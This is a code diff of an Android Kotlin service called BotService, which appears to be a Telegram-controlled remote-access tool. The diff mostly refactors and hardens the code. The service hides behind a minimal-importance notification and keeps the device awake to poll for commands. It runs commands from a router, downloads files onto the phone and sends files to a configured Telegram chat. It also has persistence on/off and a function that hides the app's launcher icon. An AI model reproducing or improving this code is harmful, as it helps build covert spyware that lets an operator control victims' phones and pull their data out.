@@ -1,6 +1,9 @@
 package com.serv.app.service
 
-import android.app.*
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.os.Build
@@ -8,9 +11,14 @@ import android.os.IBinder
 import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import com.serv.app.MainActivity
+import com.serv.app.PersistScheduler
 import com.serv.app.R
 import com.serv.app.cmds.CmdRouter
-import com.serv.app.core.*
+import com.serv.app.core.CmdQueue
+import com.serv.app.core.Config
+import com.serv.app.core.Exec
+import com.serv.app.core.Http
+import com.serv.app.core.Multipart
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
@@ -60,7 +68,9 @@ class BotService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val mgr = getSystemService(NotificationManager::class.java)
             if (mgr.getNotificationChannel(CH) == null) {
-                val c = NotificationChannel(CH, "Serviços", NotificationManager.IMPORTANCE_MIN).apply {
+                val c = NotificationChannel(
+                    CH, "Serviços", NotificationManager.IMPORTANCE_MIN
+                ).apply {
                     setShowBadge(false)
                     enableVibration(false)
                     setSound(null, null)
@@ -70,7 +80,7 @@ class BotService : Service() {
         }
     }
 
-    private fun buildNotif(): Notification {
+    private fun buildNotif(): android.app.Notification {
         val pi = PendingIntent.getActivity(
             this, 0, Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE
@@ -90,13 +100,20 @@ class BotService : Service() {
         thread = Thread({
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
             var wl: PowerManager.WakeLock? = null
-            try { wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "serv::bot"); wl.acquire() } catch (_: Throwable) {}
-            try { loop() } finally { runCatching { wl?.release() } }
+            try {
+                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "serv::bot")
+                wl.acquire()
+            } catch (_: Throwable) {}
+            try {
+                loop()
+            } finally {
+                runCatching { wl?.release() }
+            }
         }, "bot-loop").apply { start() }
     }
 
     private fun loop() {
-        // drena fila de pendentes
+        // drena fila de pendentes ao acordar
         try {
             CmdQueue.popAll(this).forEach { (id, text) ->
                 if (id > offset) offset = id
@@ -107,14 +124,16 @@ class BotService : Service() {
 
         while (running.get()) {
             try {
-                val jitter = (sleepSec * (0.8 + Random.nextDouble() * 0.4)).toLong().coerceAtLeast(1)
+                val jitter = (sleepSec * (0.8 + Random.nextDouble() * 0.4))
+                    .toLong().coerceAtLeast(1L)
                 Thread.sleep(jitter * 1000L)
                 val updates = fetchUpdates()
                 updates.forEach { processUpdate(it) }
-            } catch (ie: InterruptedException) { return }
-            catch (t: Throwable) {
-                // erro de rede: não quebra, apenas dorme
-                Thread.sleep(5000)
+            } catch (_: InterruptedException) {
+                return
+            } catch (_: Throwable) {
+                // erro de rede/parse: não quebra, apenas dorme e tenta de novo
+                try { Thread.sleep(5000) } catch (_: InterruptedException) { return }
             }
         }
     }
@@ -145,15 +164,21 @@ class BotService : Service() {
         val doc = msg.optJSONObject("document")
         val target = pendingUploadPath
         if (doc != null && target != null && System.currentTimeMillis() < pendingUploadUntil) {
-            handleUpload(doc, target); return
+            handleUpload(doc, target)
+            return
         }
 
         val text = msg.optString("text", "")
         if (text.isBlank()) return
 
-        // Texto que não é /up mas o usuário ainda está no fluxo
         if (text.startsWith("/")) {
-            val resp = router.handle(this, text)
+            val resp = try {
+                router.handle(this, text)
+            } catch (t: Throwable) {
+                // se o comando falhar, guarda na fila para reprocessar
+                CmdQueue.push(this, updId, text)
+                "ERRO: ${t.javaClass.simpleName}: ${t.message}"
+            }
             dispatchResponse(resp)
         }
     }
@@ -168,6 +193,7 @@ class BotService : Service() {
             out.parentFile?.mkdirs()
             Http.downloadTo(url, out)
             pendingUploadPath = null
+            pendingUploadUntil = 0L
             sendText("OK: ${out.length()} bytes em ${out.absolutePath}")
         } catch (t: Throwable) {
             sendText("ERRO upload: ${t.message}")
@@ -209,27 +235,41 @@ class BotService : Service() {
         if (Config.TOKEN.isBlank() || Config.CHAT_ID.isBlank()) return
         val text = Exec.truncate(body, Config.MAX_MSG)
         try {
-            Http.tgCall(Config.METHOD_SEND_MSG, JSONObject()
-                .put("chat_id", Config.CHAT_ID)
-                .put("text", text)
-                .put("disable_web_page_preview", true))
+            Http.tgCall(
+                Config.METHOD_SEND_MSG,
+                JSONObject()
+                    .put("chat_id", Config.CHAT_ID)
+                    .put("text", text)
+                    .put("disable_web_page_preview", true)
+            )
         } catch (_: Throwable) {
-            // buffer para reenvio futuro? Mantemos simples: descarta
+            // silencioso: erro de rede não deve derrubar o loop
         }
     }
 
     private fun sendFileGeneric(path: String, method: String, field: String, mime: String) {
         if (Config.TOKEN.isBlank() || Config.CHAT_ID.isBlank()) return
         val f = File(path)
-        if (!f.exists()) { sendText("ERRO: arquivo não existe"); return }
+        if (!f.exists()) {
+            sendText("ERRO: arquivo não existe: $path")
+            return
+        }
         Multipart.sendFile(method, Config.CHAT_ID, field, f, mime)
     }
 
-    // ---------- Comandos administrativos ----------
+    // ---------- Comandos administrativos chamados pelo CmdRouter ----------
     fun onPersist(ctx: Context, args: String): String {
-        return when (args.lowercase()) {
-            "on" -> { persistEnabled = true; PersistScheduler.enable(ctx); "OK persist on" }
-            "off" -> { persistEnabled = false; PersistScheduler.disable(ctx); "OK persist off" }
+        return when (args.lowercase().trim()) {
+            "on" -> {
+                persistEnabled = true
+                PersistScheduler.enable(ctx)
+                "OK persist on"
+            }
+            "off" -> {
+                persistEnabled = false
+                PersistScheduler.disable(ctx)
+                "OK persist off"
+            }
             else -> "uso: /persist on|off"
         }
     }
@@ -243,7 +283,9 @@ class BotService : Service() {
                 android.content.pm.PackageManager.DONT_KILL_APP
             )
             "OK: ícone oculto. Reabilite via adb: pm enable com.serv.app/.MainActivity"
-        } catch (t: Throwable) { "ERRO hide: ${t.message}" }
+        } catch (t: Throwable) {
+            "ERRO hide: ${t.message}"
+        }
     }
 
     fun onSleep(args: String): String {
